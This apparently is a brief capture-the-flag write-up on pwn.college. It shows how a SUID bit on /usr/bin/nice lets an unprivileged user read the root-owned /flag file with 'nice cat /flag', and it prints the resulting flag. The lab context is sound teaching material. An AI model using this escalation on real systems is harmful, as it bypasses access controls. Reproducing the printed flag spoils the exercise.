## üß† Summary:
The challenge abuses a SUID bit set on `/usr/bin/nice`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## üîç Enumeration

```bash
ls -l /usr/bin/nice
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/nice
```

-The `s` in `-rws` indicates it's a SUID binary.
-`nice` runs with **root privileges**.

## üöÄ Exploitation

The `nice`  command can run other commands ‚Äî its purpose is to run them with a modified CPU scheduling priority (called "niceness").


```bash
nice cat /flag
```

Output:
```
pwn.college{o2QCFMwsv3Urs8fxe3gzD1JLHuL.dljNxwSM0IzMyEzW}
```
